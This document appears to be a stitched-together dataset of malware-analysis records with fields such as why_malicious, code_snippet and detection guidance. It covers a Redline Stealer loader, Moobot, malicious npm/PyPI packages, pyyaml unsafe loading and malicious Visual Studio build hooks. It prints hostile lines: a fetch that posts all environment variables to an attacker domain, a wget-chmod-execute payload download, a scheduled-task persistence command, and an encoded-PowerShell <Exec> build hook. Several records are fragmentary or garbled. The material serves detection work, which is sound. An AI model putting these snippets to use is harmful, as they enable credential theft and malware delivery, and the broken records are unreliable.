Exfiltration of security product information to remote server
Reconnaissance activity following initial infection

package_info.package_manager: malicious Windows executable (delivered via Excel document exploiting CVE-2017-11882)
package_info.why_malicious: The entire package functions as a loader for the Redline Stealer malware. It is designed to extract, decrypt, and execute a secondary payload in memory, which then steals sensitive information, maintains persistence, and exfiltrates data to a remote C2 server. The loader is delivered via a malicious Excel document exploiting CVE-2017-11882, and its behaviors—such as process hollowing, credential theft, and covert C2 communication—are consistent with credential theft and unauthorized data exfiltration.

malicious_snippets.code_snippet: Loads a data block from its .Net resource called 'brfmdFiaha', decrypts it using the key 'brfmdFiaha' into a PE file, and stores it in memory.
malicious_snippets.code_behavior: At runtime, the code loads an encrypted payload from its resources, decrypts it in memory using a key matching the resource name, and prepares the resulting PE file for process hollowing, enabling in-memory execution of the Redline payload.

malice_analysis.why_suspicious: Loading and decrypting an embedded PE file from resources at runtime is a common malware technique to evade static detection and execute secondary payloads without writing them to disk.
malice_analysis.violated_expectations: Normal .NET applications do not decrypt and execute embedded PE files in memory; they typically use resources for non-executable data such as images or configuration files.
malice_analysis.similar_legitimate_use: Some legitimate software may use embedded resources for plugins or updates, but not for hidden PE files that are decrypted and executed directly in memory.
key_indicators: Obfuscated or randomized resource name ('brfmdFiaha')
Decryption key matches resource name
PE file is loaded and executed only in memory, never written to disk
Resource contains an encrypted executable payload

malicious_snippets.code_snippet: Dynamically loads Windows APIs: CreateProcessAsUser, VirtualAllocEx, WriteProcessMemory, GetThreadContext, SetThreadContext, ResumeThread, etc. Uses CreateProcessAsUser() with CREATE_SUSPENDED to create a suspended process, allocates memory in the new process, writes the decrypted payload into it, sets thread context, and resumes the process (process hollowing).
malicious_snippets.code_behavior: At runtime, the code dynamically resolves Windows API functions, creates a new process in a suspended state, allocates memory in the target process, injects the decrypted Redline payload into the allocated memory, manipulates the thread context to point to the injected code, and resumes the process, resulting in the Redline payload running under a legitimate process context.

malice_analysis.why_suspicious: Process hollowing is a well-known malware technique for evading detection by running malicious code under the guise of a legitimate process. The use of dynamic API resolution and thread context manipulation is highly indicative of malicious intent.
malice_analysis.violated_expectations: Legitimate software rarely performs process hollowing or manipulates thread context in this way, especially outside of specialized security or debugging tools.
malice_analysis.similar_legitimate_use: Some advanced security, debugging, or sandboxing tools may use similar techniques, but not in end-user applications or without user awareness.
key_indicators: Dynamic resolution of Windows API functions
Use of CREATE_SUSPENDED flag in process creation
Memory allocation and injection of PE payload
Thread context manipulation to redirect execution
No user interaction or consent for these actions

malicious_snippets.code_snippet: Executes: "cmd.exe /C schtasks /create /sc minute /mo 1 /tn 'Nafdfnasia' /tr 'C:\Users\{user name}\AppData\Roaming\packtracer.exe' /f"; then copies itself to %AppData%/packtracer.exe.
malicious_snippets.code_behavior: At runtime, the code silently creates a scheduled task named 'Nafdfnasia' to execute a copy of itself every minute, copies its executable to the AppData\Roaming directory as 'packtracer.exe', and registers the scheduled task with Windows Task Scheduler, ensuring persistent execution.

malice_analysis.why_suspicious: Creating a scheduled task for persistence and copying itself to a hidden user directory is a classic malware persistence technique, especially when done without user notification or consent.
malice_analysis.violated_expectations: Legitimate applications do not silently create scheduled tasks to run themselves every minute or copy themselves to hidden locations without user awareness.
malice_analysis.similar_legitimate_use: Some legitimate updaters or system tools may use scheduled tasks, but typically with user consent, clear naming, and transparency.
key_indicators: Silent creation of scheduled task with obfuscated/randomized name ('Nafdfnasia')
Copying executable to AppData\Roaming as 'packtracer.exe'
No user notification or consent for persistence mechanism
Frequent (every minute) scheduled execution

malicious_snippets.code_behavior: At runtime, the code establishes a SOAP-based HTTP connection to a hardcoded remote C2 server using WCF, invokes remote methods to check connectivity, receive commands, and verify updates, and maintains a persistent channel for command and control communication.

malice_analysis.why_suspicious: Establishing a covert WCF/SOAP channel to a remote server for command and control, especially to a dynamic DNS domain, is a hallmark of malware C2 communication and is rarely seen in legitimate end-user applications.
malice_analysis.violated_expectations: Normal applications do not open persistent SOAP channels to unknown external servers for remote command execution or data exfiltration.
malice_analysis.similar_legitimate_use: Enterprise applications may use WCF for legitimate remote management, but not for covert C2 or exfiltration of user data.

malicious_snippets.code_snippet:
snprintf(cmd, sizeof(cmd), "some_command %s", user_input);
system(cmd); // user_input not sanitized
malicious_snippets.code_behavior: At runtime, upon receiving a web request via CGI, the code constructs a shell command using unsanitized user input and executes it with system(), allowing attacker-supplied commands to be run as root.

malice_analysis.why_suspicious: Directly passing user-controlled input to system() without any sanitization or validation enables attackers to inject arbitrary shell commands, leading to remote code execution.
malice_analysis.violated_expectations: Web interfaces must strictly validate and sanitize all user input before passing it to system-level calls to prevent command injection.
malice_analysis.similar_legitimate_use: Legitimate use would require strict input validation or the use of safe APIs that do not invoke a shell, such as execv with argument arrays.
key_indicators: Use of system() with unsanitized user input
Shell command string constructed directly from web parameters
No input validation or sanitization before execution

malicious_snippets.code_snippet: strncpy(dest[i], src, strlen(src)); // No bounds check on dest[i]
malicious_snippets.code_behavior: At runtime, when processing a web request, the code copies user-supplied variables into a fixed-size buffer using strncpy with the length of the source string, without checking the destination buffer size, resulting in a stack-based buffer overflow.

malice_analysis.why_suspicious: Using strncpy with the length of the source string instead of the destination buffer size allows attackers to overflow the stack, potentially overwriting return addresses and enabling arbitrary code execution.
malice_analysis.violated_expectations: Input parsing functions must enforce strict buffer limits and always use the destination buffer size as the maximum copy length to prevent overflows.
malice_analysis.similar_legitimate_use: None; secure code always checks buffer sizes and uses safe string copy functions.
key_indicators: strncpy called with strlen(src) instead of sizeof(dest[i])
No bounds check on destination buffer
User input directly copied into stack buffer

malicious_snippets.code_snippet:

*eq = '\0'; // eq may be NULL, leading to crash
malicious_snippets.code_behavior: At runtime, during web request processing, the code attempts to split input on '=' by searching for the character and dereferencing the pointer without checking if it is NULL, causing a NULL pointer dereference and process crash if '=' is missing.

malice_analysis.why_suspicious: Dereferencing a NULL pointer returned by strstr when '=' is not present in the input can crash the process, resulting in a denial of service and potential instability of the device.
malice_analysis.violated_expectations: Robust input parsing must always check for NULL before dereferencing pointers returned by functions like strstr or strchr.
malice_analysis.similar_legitimate_use: None; secure code always checks pointer validity before dereferencing.

Direct dereference of potentially NULL pointer
Process crash on malformed or unexpected input

package_info.why_malicious: This report provides a general overview of software supply chain attack techniques, including dependency confusion, typosquatting, brandjacking, and malicious code injection. It does not analyze a specific malicious package or provide concrete code examples, but it details how attackers exploit package ecosystems to execute malicious code during package installation, import, or runtime.

malicious_snippets.code_snippet: // No specific code provided; describes publishing a spoofed package with a high version number to exploit dependency confusion
malicious_snippets.code_behavior: During dependency resolution and installation, the build system selects a malicious package with a spoofed name and abnormally high version number, resulting in the execution of attacker-controlled code that may access the filesystem and initiate outbound network connections.

malice_analysis.why_suspicious: Publishing a package with a name identical to an internal or private dependency and assigning it an unusually high version number is a classic indicator of a dependency confusion attack, aiming to trick automated systems into installing the attacker's code.
malice_analysis.violated_expectations: Legitimate packages should not impersonate internal or private dependencies, nor should they use version numbers to override trusted packages in a way that subverts intended dependency resolution.
malice_analysis.similar_legitimate_use: Legitimate package updates may use higher version numbers for new releases, but not to impersonate or override unrelated internal packages.
key_indicators: Package name exactly matches an internal or private dependency
Version number is significantly higher than any legitimate release
Unexpected code execution during package installation or import
Presence of install scripts or code with network or filesystem access

execution_context.trigger: When a developer installs a package with a misspelled or brandjacked name
execution_context.file_location: Public package registry (e.g., npm, PyPI) under a name similar to a popular package

malicious_snippets.code_snippet: // No specific code provided; describes typosquatting and brandjacking by publishing packages with names similar to popular libraries
malicious_snippets.code_behavior: During package installation, if a developer mistakenly installs a package with a misspelled or brandjacked name, attacker-controlled code executes, potentially accessing the filesystem and making outbound network requests to exfiltrate data.

malice_analysis.why_suspicious: Packages with names that closely resemble popular or trusted libraries are often created to deceive developers into installing malicious code, a technique known as typosquatting or brandjacking.
malice_analysis.violated_expectations: Legitimate packages do not intentionally mimic the names of well-known or trusted packages to confuse users.
malice_analysis.similar_legitimate_use: There is no legitimate reason for a package to closely mimic the name of a popular package; typosquatting is inherently deceptive.
key_indicators: Package name is a close misspelling or variant of a popular or trusted package
Brandjacking of well-known project or organization names
Unexpected code execution during installation or import
Presence of install scripts or code with network or filesystem access

execution_context.trigger: When a malicious commit is merged into a legitimate library and the library is built and distributed
execution_context.file_location: Source code files of a legitimate open-source library (e.g., main codebase, setup scripts)

malicious_snippets.code_snippet: // No specific code provided; describes injection of malicious payloads into the source code of legitimate libraries
malicious_snippets.code_behavior: After a malicious code injection into a trusted library's source code, the payload is distributed through normal build and release processes. When downstream users install or import the library, the injected code executes, potentially accessing sensitive files, environment variables, and exfiltrating data over the network.

malice_analysis.why_suspicious: Unexpected, obfuscated, or unexplained code changes in a trusted library—especially those that access sensitive files, environment variables, or perform network exfiltration—are strong indicators of malicious code injection.
malice_analysis.violated_expectations: Legitimate code changes are transparent, reviewed, and do not introduce hidden or obfuscated payloads that access sensitive resources or perform unauthorized network communication.
malice_analysis.similar_legitimate_use: Legitimate code changes may add new features or dependencies, but should not introduce hidden payloads or unexplained access to sensitive data.
key_indicators: Obfuscated or unexplained code changes in trusted libraries
New logic for network exfiltration or data collection
Access to sensitive files or environment variables not present in previous versions
Unusual scripts or code in build or install hooks

attack_chain.action: Attacker publishes a malicious package using dependency confusion (spoofed name and high version), typosquatting (misspelled or brandjacked name), or injects malicious code into a legitimate library's source code.
attack_chain.leads_to: Malicious package or code is installed or imported by the victim's build system or application.

attack_chain.action: Malicious code executes during package installation, import, or runtime, accessing sensitive files, environment variables, or making outbound network connections to exfiltrate data.
attack_chain.leads_to: Attacker gains access to sensitive data, credentials, or control over the victim's system or environment.

behavioral_signatures: Packages with names that closely resemble popular or internal dependencies (typosquatting, brandjacking)
Packages with abnormally high version numbers compared to legitimate releases (dependency confusion)
Unexpected network requests or outbound connections during package installation or import
Obfuscated, unexplained, or unauthorized code changes in trusted libraries

Source code files in trusted libraries containing obfuscated or unexplained logic

detection_knowledge.how_to_detect: Continuously monitor dependency trees for packages with suspicious names or abnormally high version numbers. Use automated tools to scan for unexpected network activity during dependency installation or import, and to detect obfuscated or unauthorized code changes in trusted libraries. Validate package provenance and require SBOMs for transparency. Flag packages that match known typosquatting or dependency confusion patterns, and review code changes for hidden payloads or unauthorized access to sensitive resources.

package_info.why_malicious: This report does not analyze a specific malicious package, but instead details GuardDog's detection heuristics for identifying malicious behaviors in npm and PyPI packages. The heuristics focus on behaviors such as exfiltration of environment variables, silent execution of binaries, dynamic code execution, and unauthorized install scripts, all of which are commonly observed in malicious packages.

execution_context.file_location: index.js or any JavaScript file in the package

malicious_snippets.code_snippet:
const env = JSON.stringify(process.env);
fetch('https://malicious-domain.com/exfil', { method: 'POST', body: env });
malicious_snippets.code_behavior: At runtime, the code serializes all environment variables, sends them via HTTP POST to an external domain, resulting in exfiltration of sensitive environment data.

malice_analysis.why_suspicious: The code collects all environment variables and transmits them to an external server, which is a common method for stealing secrets such as API keys, credentials, and tokens.
malice_analysis.violated_expectations: Legitimate packages should not transmit the full set of environment variables to external servers, especially without user knowledge or consent.
malice_analysis.similar_legitimate_use: Some telemetry or error reporting tools may send limited, non-sensitive environment data for debugging, but never the complete environment or secrets.
key_indicators: Serialization of process.env
Outbound HTTP POST to non-standard or suspicious domain
No user interaction or explicit consent
Hardcoded external endpoint

execution_context.file_location: index.js or any JavaScript file in the package

malicious_snippets.code_snippet:
const { exec } = require('child_process');
exec('./malicious-binary');
malicious_snippets.code_behavior: At runtime, the code invokes child_process.exec to silently execute a bundled or downloaded binary file, enabling arbitrary code execution on the host system.

malice_analysis.why_suspicious: Executing binaries without user awareness can be used to run malware, establish persistence, or perform unauthorized actions on the victim's machine.
malice_analysis.violated_expectations: Legitimate packages should only execute binaries with clear user intent, proper documentation, and explicit purpose.
malice_analysis.similar_legitimate_use: Build tools or CLI utilities may execute binaries, but this should be clearly documented and only occur in expected contexts.
key_indicators: Use of child_process.exec or similar process execution APIs
Execution of non-standard or undocumented binaries
No user prompt or documentation for binary execution
Presence of unexpected binary files in package

malice_analysis.violated_expectations: Published packages should match their public source code repositories; any differences should be minimal, documented, and limited to build artifacts.

package_info.why_malicious: The pyyaml package version 3.13 is vulnerable to insecure deserialization due to the default behavior of yaml.load(), which allows the construction of arbitrary Python objects from YAML input. If an attacker can control the YAML input, this can be exploited to achieve remote code execution, making this version of the package dangerous in any context where untrusted YAML is parsed.

required_permissions: read access to YAML input file

malicious_snippets.code_snippet:
import yaml
with open('input.yaml', 'r') as f:
    data = yaml.load(f)
malicious_snippets.code_behavior: At runtime, the code calls yaml.load() on the contents of an input YAML file, deserializing the data without specifying a safe loader, which allows arbitrary Python objects to be constructed from attacker-controlled input, resulting in potential remote code execution.

malice_analysis.why_suspicious: The use of yaml.load() without specifying a Loader argument in pyyaml 3.13 is dangerous because it enables the deserialization of arbitrary objects, which can be exploited by attackers to execute malicious code if they control the YAML input.
malice_analysis.violated_expectations: Normal, secure usage would employ yaml.safe_load() or specify a safe Loader to prevent arbitrary code execution. This code violates that expectation by using the unsafe default, exposing the application to code execution risks.
malice_analysis.similar_legitimate_use: Deserializing YAML files from trusted, internal sources in a controlled environment where the input cannot be manipulated by external users.
key_indicators: Use of yaml.load() without Loader argument in codebase
Parsing of YAML files from potentially untrusted sources
Dependency on pyyaml version 3.13 or earlier
Absence of yaml.safe_load() or explicit Loader specification
Known CVE-2017-18342 affecting this version

attack_chain.action: Application loads YAML input using yaml.load() from pyyaml 3.13 without specifying a Loader.
attack_chain.leads_to: If an attacker can supply or modify the YAML input, they can craft payloads that result in arbitrary code execution within the application process.

behavioral_signatures: Use of yaml.load() without specifying a Loader argument
Deserialization of YAML files from untrusted or user-supplied sources using pyyaml 3.13
file_indicators: requirements.txt or pyproject.toml specifying pyyaml==3.13
Source code files containing 'yaml.load(' without a Loader argument
detection_knowledge.how_to_detect: Automated scanners should flag any project dependencies specifying pyyaml versions <4.2b1 in requirements.txt or pyproject.toml. Additionally, audit source code for calls to yaml.load() that do not specify a Loader argument, especially in contexts where the YAML input may be user-controlled. Flag any such usage as a critical security risk for remote code execution.

package_info.why_malicious: Both Moobot and ShellBot are malware families deployed via exploitation of Cacti and Realtek vulnerabilities. They enable remote attackers to gain control of compromised systems, establish command and control (C2) communication, perform distributed denial-of-service (DDoS) attacks, terminate competing malware, and download further payloads. These families are designed solely for malicious activity, with no legitimate functionality or benign use cases.

execution_context.file_location: Injected via command injection in Cacti's remote_agent.php or Realtek's UDPServer

malicious_snippets.code_snippet: wget http://malicious_host/moobot -O /tmp/moobot; chmod +x /tmp/moobot; /tmp/moobot realtek.<Filename>
malicious_snippets.code_behavior: At exploit-time (post-exploitation), the code downloads the Moobot binary from a remote server using wget, writes it to /tmp/moobot, changes its permissions to executable, and immediately executes it with a specific parameter, resulting in the establishment of persistence and C2 communication.

malice_analysis.why_suspicious: The code performs arbitrary code execution by downloading and running an untrusted binary from a remote server, which is a classic malware delivery technique and not expected in legitimate post-exploitation activity.
malice_analysis.violated_expectations: Normal post-exploitation behavior should not involve fetching and executing external binaries from untrusted sources, especially via command injection.
malice_analysis.similar_legitimate_use: Automated update or deployment scripts may download and execute binaries, but only from trusted, verified sources and with proper integrity checks.
key_indicators: wget or curl download from external IP or domain
chmod +x on newly downloaded file
immediate execution of downloaded binary
execution from /tmp directory

malicious_snippets.code_snippet: Prints 'listening to tun0'; connects to C2 host 'troon.dns.army'; sends heartbeat '0x336699'; receives and executes commands from C2.
malicious_snippets.code_behavior: At runtime, the Moobot binary establishes a persistent outbound connection to a hardcoded C2 server (troon.dns.army), sends periodic heartbeat messages (e.g., '0x336699'), and listens for further instructions, enabling remote control and attack execution by the attacker.

malice_analysis.why_suspicious: Unsolicited outbound connections to hardcoded C2 infrastructure, combined with periodic heartbeat messages and remote command execution, are hallmarks of botnet malware.
malice_analysis.violated_expectations: Legitimate software should not connect to unknown external servers for command and control, nor should it accept and execute arbitrary remote instructions without user consent and authentication.
malice_analysis.similar_legitimate_use: Some legitimate remote management tools connect to central servers, but only with user consent, proper authentication, and secure communication.
key_indicators: Hardcoded C2 domain or IP in binary
Regular heartbeat messages to remote server
Persistent outbound connection from non-standard process
Ability to receive and execute remote commands

malicious_snippets.code_snippet: for proc in [dvrHelper, Ni**eR69xd, 1337SoraLOADER, ...]: os.system('kill -9 ' + proc)
malicious_snippets.code_behavior: At runtime, during Moobot process startup, the malware enumerates a list of known competing botnet process names and forcefully terminates them using 'kill -9', ensuring exclusive control of the infected device for its own operation.

malice_analysis.why_suspicious: Forcefully terminating unrelated processes, especially those associated with other malware, is a strong indicator of malicious intent and is not a behavior found in legitimate software.
malice_analysis.violated_expectations: Legitimate software should not interfere with unrelated processes, particularly by using 'kill -9' on a list of known malware process names.
malice_analysis.similar_legitimate_use: System management tools may terminate processes, but only based on user input or for system health, not based on a hardcoded list of competing malware.
key_indicators: Enumeration of known botnet process names
Use of 'kill -9' for process termination
Process termination at malware startup

package_info.why_malicious: All published versions of this package are malicious because they were mass-published solely to promote phishing campaigns. The packages contain no legitimate code or functionality; instead, they use enticing names and descriptions to lure users into clicking links to phishing sites, facilitating credential theft, scams, and referral fraud. The package descriptions are weaponized as the primary attack vector.

execution_context.trigger: When a user views the package listing on the registry website (pre-install, pre-import)
execution_context.file_location: Package description metadata (e.g., description field in package.json, setup.py, or NuGet .nuspec)

Description: 'Yalla Ludo Diamond Hack - Get unlimited diamonds at https://lucymods.com. No survey required!'

malicious_snippets.code_behavior: When a user views the package listing on the registry website, the package description displays enticing messages containing embedded phishing URLs; this exposes the user to social engineering, leading them to click the links, which results in redirection to external phishing sites.

malice_analysis.why_suspicious: The package description contains direct links to known phishing domains and employs social engineering tactics such as promises of free game codes, hacks, or resources to entice users. There is no legitimate technical content or functionality in the package.
malice_analysis.violated_expectations: Normal package descriptions provide information about the package's purpose, usage, or authorship. In this case, the description is weaponized as a phishing lure, containing only unrelated, enticing offers and links to malicious sites.
malice_analysis.similar_legitimate_use: Legitimate packages may include links to official documentation or project homepages, but never to unrelated third-party sites offering 'free' game cheats, hacks, or resources. Linking to such sites is not a standard or acceptable practice.

package_info.package_name: N/A (Social Engineering via Fake GitHub Profiles)
package_info.why_malicious: The techniques described are not about a specific malicious software package, but about abusing GitHub's profile and repository features to create fake, highly credible developer identities. These fake profiles are then used to gain trust and potentially distribute malicious code or gain elevated access to legitimate projects. The macro-level threat is the use of social engineering and technical manipulation of GitHub's trust signals to facilitate further attacks.

malice_analysis.similar_legitimate_use: Legitimate users join organizations they are actually employed by or affiliated with, and such affiliations can be independently verified.

Use of high-profile company names in organization field

malice_analysis.violated_expectations: Legitimate packages use the description field to explain package functionality or provide links to official documentation or project homepages, not to lure users to unrelated, external, and malicious sites.
malice_analysis.similar_legitimate_use: Legitimate packages may include links to documentation, source code repositories, or official project websites, but never to unrelated phishing or scam domains.
key_indicators: Presence of external URLs in the description field pointing to known phishing or scam domains
Use of enticing or manipulative language promising cheats, free codes, or followers
Absence of any actual package functionality; the description itself is the attack vector
Repetition of similar descriptions and links across a large number of packages

detection_knowledge.how_to_detect: Automated scanners should parse package metadata (description fields) for external URLs, flagging those that match known phishing or scam domains. Descriptions containing manipulative language (e.g., cheats, free, followers) and links to non-official sites should be flagged for review. Monitor for patterns of large-scale, automated publication (e.g., many packages from similar usernames or with similar content). Maintain and regularly update a list of known phishing domains for cross-referencing. Block or warn users about packages exhibiting these characteristics to prevent exposure.

package_info.why_malicious: The repositories are intentionally crafted to distribute malware by embedding obfuscated, auto-executing code in Visual Studio project files. The code initiates a multi-stage attack: it downloads and executes further payloads, establishes persistence, and targets cryptocurrency wallets. The repositories use social engineering tactics such as fake stars and frequent updates to lure developers, and the code is designed to evade detection and analysis by using obfuscation, encoded payloads, and immediate cleanup of artifacts.

malicious_snippets.code_snippet: <Exec Command="cmd /c mkdir %TEMP%\tmpdir && echo Set objFSO = CreateObject("Scripting.FileSystemObject") > %TEMP%\tmpdir\run.vbs && echo Set objShell = CreateObject("WScript.Shell") >> %TEMP%\tmpdir\run.vbs && echo Dim base64, cmd, shell, exec, output >> %TEMP%\tmpdir\run.vbs && echo base64 = "[BASE64-ENCODED-POWERSHELL]" >> %TEMP%\tmpdir\run.vbs && echo Set shell = CreateObject("WScript.Shell") >> %TEMP%\tmpdir\run.vbs && echo cmd = "powershell -EncodedCommand " ^& base64 >> %TEMP%\tmpdir\run.vbs && echo shell.Run cmd, 0, True >> %TEMP%\tmpdir\run.vbs && cscript //nologo %TEMP%\tmpdir\run.vbs && del %TEMP%\tmpdir\run.vbs && rmdir %TEMP%\tmpdir" />
malicious_snippets.code_behavior: At build-time, the code creates a temporary directory, writes a VBScript file that decodes and executes a base64-encoded PowerShell payload, runs the script, and deletes all traces, resulting in the execution of the next-stage malware.

malice_analysis.why_suspicious: Embedding obfuscated, auto-executing scripts in project files is a common malware tactic. The use of temporary files, encoded payloads, and immediate cleanup is designed to evade detection and forensic analysis.
malice_analysis.violated_expectations: Normal .csproj/.vcxproj files may use pre/post-build events for legitimate build steps, but not for downloading, decoding, and executing hidden scripts or binaries, especially not with obfuscated or encoded payloads.
malice_analysis.similar_legitimate_use: Pre/post-build events are sometimes used for code generation or custom build steps, but not for running encoded PowerShell or network operations, nor for executing scripts that are not part of the build process.
key_indicators: Obfuscated, encoded PowerShell payload embedded in project file
Creation and deletion of temporary files and directories during build
Execution of external scripts via <Exec> command in project file
Immediate cleanup of artifacts to hinder analysis

execution_context.file_location: Decoded from base64 in the project file (PowerShell payload)

malicious_snippets.code_behavior: At build-time, the code determines the victim's country via an external geolocation service, selects a set of URLs based on the result, downloads encrypted payloads, extracts them with a hardcoded password, executes the extracted binaries, and deletes the downloaded archives.

malice_analysis.why_suspicious: The script performs geolocation, conditional payload selection, downloads and executes encrypted binaries, and cleans up evidence. These are classic malware behaviors designed to evade detection and target victims selectively.
malice_analysis.violated_expectations: Build scripts should not perform network geolocation, download and execute arbitrary binaries, or handle encrypted payloads. Such actions are outside the scope of normal build automation.
malice_analysis.similar_legitimate_use: Rarely, build scripts may download dependencies, but not encrypted executables, perform geolocation, or execute unknown binaries.
key_indicators: External geolocation check using public IP API
Conditional payload delivery based on country
Download and extraction of encrypted archives during build
Execution of unknown binaries from temporary directories
Silent error handling to suppress exceptions
